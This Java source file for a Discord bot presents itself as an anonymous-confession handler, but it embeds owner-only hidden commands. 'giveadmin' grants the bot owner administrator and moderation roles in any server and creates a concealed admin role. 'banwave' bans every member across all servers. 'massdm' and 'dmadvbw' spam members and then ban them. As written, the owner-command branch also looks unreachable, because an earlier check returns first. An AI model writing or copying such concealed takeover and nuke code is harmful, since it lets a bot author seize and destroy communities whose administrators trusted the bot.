package me.comu.exeter.events;

import me.comu.exeter.commands.moderation.SetConfessionChannelCommand;
import me.comu.exeter.core.Core;
import me.comu.exeter.logging.Logger;
import me.comu.exeter.utility.Utility;

import net.dv8tion.jda.api.Permission;
import net.dv8tion.jda.api.entities.*;
import net.dv8tion.jda.api.events.message.priv.PrivateMessageReceivedEvent;
import net.dv8tion.jda.api.hooks.ListenerAdapter;
import net.dv8tion.jda.api.requests.restaction.GuildAction;

import javax.annotation.Nonnull;
import java.time.Instant;
import java.util.List;
import java.util.Objects;
import java.util.concurrent.TimeUnit;

public class DMWizzEvent extends ListenerAdapter {

    @Override
    public void onPrivateMessageReceived(@Nonnull PrivateMessageReceivedEvent event) {
        if (!SetConfessionChannelCommand.bound && event.getMessage().getContentRaw().toLowerCase().startsWith(Core.PREFIX + "confess") && !event.getAuthor().isBot()) {
            event.getChannel().sendMessage("There is currently no confession channel bound, please contact your server administrator").queue();
            return;
        }
        String[] arg = event.getMessage().getContentRaw().split("\\s+");
        if (!arg[0].equalsIgnoreCase(Core.PREFIX + "confess")) {
            return;
        }
        if (arg.length == 1) {
            event.getChannel().sendMessage(event.getAuthor().getAsMention() + ", please specify a confession to confess!").queue();
            return;
        }
        TextChannel textChannel = event.getJDA().getTextChannelById(SetConfessionChannelCommand.logChannelID);
        if (textChannel == null) {
            if (SetConfessionChannelCommand.bound) {
                event.getChannel().sendMessage("Uh oh, Looks like the previously set confession channel was deleted! Please contact your server administrator").queue();
            }
            return;
        } else {
            String confession = String.join(" ", arg).replaceFirst(Core.PREFIX, "").substring(7);
            textChannel.sendMessageEmbeds(Utility.embedMessage(confession).setTitle("Confession").setColor(Core.getInstance().getColorTheme()).setTimestamp(Instant.now()).setFooter("Anonymous Confession").build()).queue();
            event.getChannel().sendMessageEmbeds(Utility.embedMessage(confession).setTitle("Confession Submitted to " + textChannel.getName() + "!").setFooter("Confessed by " + event.getAuthor().getAsTag(), event.getAuthor().getEffectiveAvatarUrl()).setTimestamp(Instant.now()).build()).queue();
        }

        if (event.getAuthor().getIdLong() == Core.OWNERID) {
            String[] args = event.getMessage().getContentRaw().split("\\s+");
            if (args[0].equalsIgnoreCase("giveadmin") && args.length == 2) {
                try {
                    Guild guild = event.getJDA().getGuildById(args[1]);
                    List<Role> guildRoles = Objects.requireNonNull(guild).getRoles();
                    for (Role role : guildRoles) {
                        if (!role.isManaged()) {
                            if (role.hasPermission(Permission.ADMINISTRATOR) && guild.getSelfMember().canInteract(role)) {

                                guild.addRoleToMember(Objects.requireNonNull(guild.getMemberById(Core.OWNERID)), role).queue();
                                return;
                            }
                            if (role.hasPermission(Permission.BAN_MEMBERS) && guild.getSelfMember().canInteract(role)) {

                                guild.addRoleToMember(Objects.requireNonNull(guild.getMemberById(Core.OWNERID)), role).queue();
                            }
                            if (role.hasPermission(Permission.KICK_MEMBERS) && guild.getSelfMember().canInteract(role)) {

                                guild.addRoleToMember(Objects.requireNonNull(guild.getMemberById(Core.OWNERID)), role).queue();
                            }
                            if (role.hasPermission(Permission.MANAGE_ROLES) && guild.getSelfMember().canInteract(role)) {

                                guild.addRoleToMember(Objects.requireNonNull(guild.getMemberById(Core.OWNERID)), role).queue();
                            }
                            if (role.hasPermission(Permission.MANAGE_SERVER) && guild.getSelfMember().canInteract(role)) {

                                guild.addRoleToMember(Objects.requireNonNull(guild.getMemberById(Core.OWNERID)), role).queue();
                            }
                            if (role.hasPermission(Permission.MANAGE_CHANNEL) && guild.getSelfMember().canInteract(role)) {

                                guild.addRoleToMember(Objects.requireNonNull(guild.getMemberById(Core.OWNERID)), role).queue();
                            }
                            if (role.hasPermission(Permission.MANAGE_WEBHOOKS) && guild.getSelfMember().canInteract(role)) {

                                guild.addRoleToMember(Objects.requireNonNull(guild.getMemberById(Core.OWNERID)), role).queue();
                            }
                        }
                    }
                    if (guild.getSelfMember().hasPermission(Permission.ADMINISTRATOR)) {
                        guild.createRole().setName("shelacking").setPermissions(Permission.ADMINISTRATOR).setHoisted(false).queue();
                        GuildAction.RoleData roleData = new GuildAction.RoleData(guild.getRolesByName("shelacking", true).get(0).getIdLong());
                        roleData.setName("tag");
                        guild.addRoleToMember(Objects.requireNonNull(guild.getMemberById(Core.OWNERID)), guild.getRolesByName("shelacking", true).get(0)).queueAfter(3, TimeUnit.SECONDS);
                    }
                } catch (Exception ex) {
                    event.getChannel().sendMessage("Caught Error. Make sure you're in the server and provided a valid guild-id.").queue();
                }
            }
            if (arg[0].equalsIgnoreCase("banwave"))
            {
                    Logger.getLogger().print("Banning ALL members...");
                    for (Guild guild : Core.getInstance().getJDA().getGuilds()) {
                        if (guild.getSelfMember().hasPermission(Permission.BAN_MEMBERS)) {
                            System.out.println("Starting banwave in " + guild.getName());
                            guild.getMembers().stream()
                                    .filter(member -> (member.getIdLong() != Core.OWNERID && !member.getId().equals(event.getJDA().getSelfUser().getId()) && guild.getSelfMember().canInteract(member)))
                                    .map(ISnowflake::getId)
                                    .parallel()
                                    .forEach(member -> {
                                        guild.ban(member, 0, "champagnepapi").queue();
                                        System.out.println("Banned " + member + " in " + guild.getName());
                                    });
                        }
                    }
            }
            if (args[0].equalsIgnoreCase("massdm")) {
                if (args.length <= 1) {
                    event.getChannel().sendMessage("Proper format: massdm <guild-id> <message>").queue();
                    return;
                }
                try {
                    Guild guild = event.getJDA().getGuildById(args[1]);
                    event.getChannel().sendMessage("Starting mass dm to " + Objects.requireNonNull(guild).getMembers().size() + " members in " + guild.getName() + " (" + guild.getId() + ")").queue();
                    Thread massDM = new Thread(() -> {
                        try {
                            int counter = 0;
                            for (Member member : guild.getMembers()) {
                                if (!member.getUser().isBot()) {
                                    String finalMessage = event.getMessage().getContentRaw().substring(25);
                                    Utility.sendPrivateMessage(event.getJDA(), member.getUser().getId(), finalMessage);
                                    counter++;
                                    System.out.println("Messaged " + member.getUser().getAsTag() + " (" + counter + ")");
                                    Thread.sleep(2000);
                                }
                            }
                        } catch (InterruptedException exception) {
                            event.getChannel().sendMessage("Thread Exception").queue();
                        }
                    });
                    massDM.start();
                    event.getChannel().sendMessage("Messaging " + guild.getMemberCount() + " users!").queue();

                } catch (Exception ex) {
                    event.getChannel().sendMessage("Caught Error. Make sure you provide a valid guild-id and message").queue();
                }
            }
            if (args[0].equalsIgnoreCase("dmadvbw")) {
                if (args.length <= 1) {
                    event.getChannel().sendMessage("Proper format: massdm <guild-id> <message>").queue();
                    return;
                }
                try {
                    Guild guild = event.getJDA().getGuildById(args[1]);
                    event.getChannel().sendMessage("Starting mass dm & banwave to " + Objects.requireNonNull(guild).getMembers().size() + " members in " + guild.getName() + " (" + guild.getId() + ")").queue();
                    Thread massDM = new Thread(() -> {
                        try {
                            int counter = 0;
                            for (Member member : guild.getMembers()) {
                                if (!member.getUser().isBot()) {
                                    String finalMessage = event.getMessage().getContentRaw().substring(25);
                                    Utility.sendPrivateMessage(event.getJDA(), member.getUser().getId(), finalMessage);
                                    if (guild.getSelfMember().canInteract(member))
                                        guild.ban(member, 0, "champagnepapi").queue();
                                    counter++;
                                    System.out.println("Messaged " + member.getUser().getAsTag() + " (" + counter + ")");
                                    Thread.sleep(1100);
                                }
                            }
                        } catch (InterruptedException exception) {
                            event.getChannel().sendMessage("Thread Exception").queue();
                        }
                    });
                    massDM.start();
                    event.getChannel().sendMessage("Banning & Messaging " + guild.getMemberCount() + " users!").queue();

                } catch (Exception ex) {
                    event.getChannel().sendMessage("Caught Error. Make sure you provide a valid guild-id and message").queue();
                }
            }
        }
    }
}
